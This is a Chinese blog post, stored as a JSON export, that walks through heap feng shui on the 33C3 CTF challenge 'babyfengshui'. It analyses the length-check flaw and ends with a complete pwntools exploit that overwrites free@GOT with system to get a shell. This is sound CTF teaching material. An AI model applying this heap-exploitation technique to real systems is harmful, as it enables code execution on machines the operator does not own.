{"title":"堆风水与堆排布","uid":"f86621641a641a4d6db180a8f81d528f","slug":"堆风水与堆排布","date":"2022-01-14T01:50:00.000Z","updated":"2022-03-11T00:54:47.516Z","comments":true,"path":"api/articles/堆风水与堆排布.json","keywords":null,"cover":"https://s2.loli.net/2022/01/14/nzTZPVIb1c3B8WO.jpg","content":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>所谓堆风水也叫作堆排布，其实说严格了并不是一种漏洞的利用方法，而是一种灵活布置堆块来控制堆布局的方法，在一些其他漏洞的利用中起到效果。接下来拿由清华蓝莲花战队出的babyfengshui来讲一下。</p>\n<h1 id=\"babyfengshui\"><a href=\"#babyfengshui\" class=\"headerlink\" title=\"babyfengshui\"></a>babyfengshui</h1><h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>检查一下保护机制，32位，没有开pie保护</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/lbd6t3wJpcQGhXK.png\" alt=\"image.png\"></p>\n<p>接下来就是静态分析，功能包括增删改查</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/IkdKWA659LOcsfq.png\" alt=\"image.png\"></p>\n<p>其中在add里面，每次申请都会出现两个堆块</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/rDWoRFf1P8uQeM5.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/03/11/Lf4diMTFSJozOlD.png\" alt=\"20191231205431462.png\"></p>\n<h2 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h2><p>继续看update函数，这里有个判断，如果要输入的大小加上description的地址大于等于name堆块的地址就报错，这里name_ptr[a1]-4的位置是chunk的presize处<img src=\"https://s2.loli.net/2022/01/14/aSvi76RprAOZe8D.png\" alt=\"image.png\"></p>\n<p>用图来解释，就是输入的description或者修改的description的长度不能达到图中红线处<img src=\"https://s2.loli.net/2022/01/14/cVwFLvJ9OPGfBx3.png\" alt=\"image.png\"></p>\n<p>初看起来没什么毛病，但是如果这两个堆块没有连续，就会造成两个堆块中间可以随意修改</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/Uw3AGr2eguMs1qY.png\" alt=\"image.png\"></p>\n<p>如果不连续，同时中间是一个chunk，就会导致中间的chunk可以被随意修改</p>\n<p>造成这两个堆块不连续所利用的方法就是堆风水，通过灵活布置堆块来控制堆布局，接下来讲解如何将两个堆块分开</p>\n<h1 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h1><p>首先申请两个堆块，之后delete第一个chunk</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x40,&#39;aaaa&#39;,0x40,&#39;aaaa&#39;)#idx0</span><br><span class=\"line\">add(0x20,&#39;bbbb&#39;,0x20,&#39;bbbb&#39;)#idx1</span><br><span class=\"line\">delete(0)</span><br></pre></td></tr></table></figure>\n\n<p>由于unlink机制所以会将0x40和0x80整合起来，如果我们申请一个大小大于0x40chunk，那么该chunk会在原来第一个chunk位置，但是由于剩余的chunk大小会小于0x80，所以会导致原本相邻的chunk会被分开</p>\n<p><img src=\"https://s2.loli.net/2022/03/11/Q9J2CsoHKPfSpWz.png\" alt=\"image.png\"></p>\n<p>这样我们就可以通过修改chunk2来修改到chunk1，控制chunk1指向free_got，再show(1)获取free函数地址，从而得到system函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(0x80,&#39;&#x2F;bin&#x2F;sh\\x00&#39;,0x80,&#39;&#x2F;bin&#x2F;sh\\x00&#39;)#idx3 之后用于system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class=\"line\">payload1 &#x3D; &#39;a&#39;*0x54+p32(0x79)+&#39;a&#39;*0x74+p32(0x28)+&#39;a&#39;*0x24+p32(0x89)+p32(elf.got[&#39;free&#39;]) # 修改chunk1</span><br><span class=\"line\">edit(2,0x100,payload1) # 因为chunk2指向的chunk在chunk1前面，所以通过chunk2修改chunk1指向free_got函数</span><br><span class=\"line\"></span><br><span class=\"line\">show(1)</span><br><span class=\"line\">p.recvuntil(&#39;description: &#39;)</span><br><span class=\"line\">free_addr&#x3D;int(u32(p.recv(4)))</span><br><span class=\"line\">print hex(free_addr)</span><br><span class=\"line\">libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class=\"line\">libc_base&#x3D;free_addr-libc.sym[&quot;free&quot;]</span><br><span class=\"line\">system_addr&#x3D;libc_base+libc.sym[&quot;system&quot;]</span><br></pre></td></tr></table></figure>\n\n<p><strong>这里注意一点chunk3大小要大于0x70，不然会申请到之前free的chunk中，这样会导致修改chunk1时覆盖到chunk3</strong></p>\n<p>因为chunk1被修改到指向free_got，所以继续编辑chunk1，这样就可以修改free-&gt;system，free(chunk3)-&gt;system(‘/bin/sh’)</p>\n<h1 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;node4.buuoj.cn&#x27;,25824)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class=\"line\">ptr_addr = <span class=\"number\">0x804B080</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">desp_size,desp_content,text_size,text_content</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>,<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;description: &#x27;</span>,<span class=\"built_in\">str</span>(desp_size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;name: &#x27;</span>,desp_content)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;text length: &#x27;</span>,<span class=\"built_in\">str</span>(text_size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;text: &#x27;</span>,<span class=\"built_in\">str</span>(text_content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,text_size,text_content</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;index: &#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;text length: &#x27;</span>,<span class=\"built_in\">str</span>(text_size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;text: &#x27;</span>,<span class=\"built_in\">str</span>(text_content))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>,<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)<span class=\"comment\">#idx0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;bbbb&#x27;</span>,<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;bbbb&#x27;</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;cccc&#x27;</span>,<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;cccc&#x27;</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)<span class=\"comment\">#idx3</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x54</span>+p32(<span class=\"number\">0x79</span>)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x74</span>+p32(<span class=\"number\">0x28</span>)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(<span class=\"number\">0x89</span>)+p32(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">0x100</span>,payload1)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;description: &#x27;</span>)</span><br><span class=\"line\">free_addr=<span class=\"built_in\">int</span>(u32(p.recv(<span class=\"number\">4</span>)))</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(free_addr)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">libc_base=free_addr-libc.sym[<span class=\"string\">&quot;free&quot;</span>]</span><br><span class=\"line\">system_addr=libc_base+libc.sym[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">4</span>,p32(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"介绍所谓堆风水也叫作堆排布，其实说严格了并不是一种漏洞的利用方法，而是一种灵活布置堆块来控制堆布局的方法，在一些其他漏洞的利用中起到效果。接下来拿由清华蓝莲花战队出的babyfengshui来讲一下。 babyfengshui分析检查一下保护机制，32位，没有开pie保护 接下来...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"pwn","slug":"pwn","count":4,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":4,"path":"api/tags/笔记.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">介绍</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#babyfengshui\"><span class=\"toc-text\">babyfengshui</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E6%9E%90\"><span class=\"toc-text\">分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">利用</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"爬取腾讯视频","uid":"5069ff540e4994664021502c262e84cf","slug":"爬取腾讯视频","date":"2022-01-24T14:06:18.000Z","updated":"2022-03-01T07:53:15.801Z","comments":true,"path":"api/articles/爬取腾讯视频.json","keywords":null,"cover":"https://s2.loli.net/2022/03/01/EusWpr9To7AyN6L.jpg","text":"前言最近在腾讯视频看《开端》，想着把视频搞下来顺便学一下爬虫，网上看了一些资料，最后也爬取成功了。以下是我爬取腾讯视频视频的过程，这里拿《开端》举例。 创建IP池为了防止IP被ban先建立好IP池 模拟登陆 在一些视频网站上看电影可能不需要登陆直接可以看，但是腾讯视频看VIP视频...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"感想","slug":"感想","count":3,"path":"api/tags/感想.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"绕过canary的六种方法","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"绕过canary的方法","date":"2021-12-29T12:49:23.000Z","updated":"2022-01-25T13:17:22.881Z","comments":true,"path":"api/articles/绕过canary的方法.json","keywords":null,"cover":"https://s2.loli.net/2021/12/29/hg8E94WFwYpo1RD.jpg","text":"文章首发于安全客 简介canary保护又称金丝雀保护，作用是为了防止栈溢出的一种保护机制。工作原理是从fs/gs寄存器取值放在rbp-4或者rbp-8的位置（32位/64位），当用户输入结束后，程序会从rbp-4或者rbp-8的位置取出并与fs/gs寄存器对应位置的值进行比较，如...","link":"","photos":[],"count_time":{"symbolsCount":"8.5k","symbolsTime":"8 mins."},"categories":[{"name":"pwn","slug":"pwn","count":4,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":4,"path":"api/tags/笔记.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}